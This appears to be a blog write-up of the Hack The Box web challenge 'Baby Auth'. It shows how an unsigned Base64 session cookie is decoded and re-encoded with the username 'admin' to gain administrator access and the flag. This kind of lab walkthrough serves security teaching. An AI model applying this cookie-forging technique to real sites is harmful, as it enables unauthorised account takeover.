---
title: "HTB: Baby Auth"
#last_modified_at: 2021-11-09T14:19:00+01:00
header.image: "/assets/images/avatar_black.png"
categories:
  - HTB
tags:
  - Easy-Challenge
  - Web
  - OWASP Top 10
  - Broken Authentication
---

# Quick Summary
A easy challenge that deals with `Broken Authentication` and involves `Cookie Tampering`.

## Description
> Who needs session integrity these days?

# Enumeration
Visiting the website shows a member login screen:
![Website startpage](/assets/htb/baby_auth/website.png)

Trying default credentials of `admin`:`admin` redirects to `/auth/login` and the following message:
![Invalid username or password](/assets/htb/baby_auth/invalid_login.png)

There's a link to `/register` at the bottom of the page to create a new account:
![Create new account](/assets/htb/baby_auth/create_account.png)

Creating the account with `eplots`:`password1` and then logging in shows the following message:
![Not admin](/assets/htb/baby_auth/not_admin.png)

Looking at the cookie it's `Base64` encoded:
![PHPSESSID](/assets/htb/baby_auth/phpsessid.png)

Decoding the cookie shows the username:

```bash
$ echo 'eyJ1c2VybmFtZSI6ImVwbG90cyJ9' | base64 -d
{"username":"eplots"}
```

# Exploit

```bash
$ echo '{"username":"admin"}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIn0=
```

Changing the cookie to the new one and refreshing the page gets the flag:
![Changed cookie](/assets/htb/baby_auth/changed_cookie.png)

# Pwned confirmation
![Pwned confirmation](/assets/htb/baby_auth/baby_auth_pwned.png)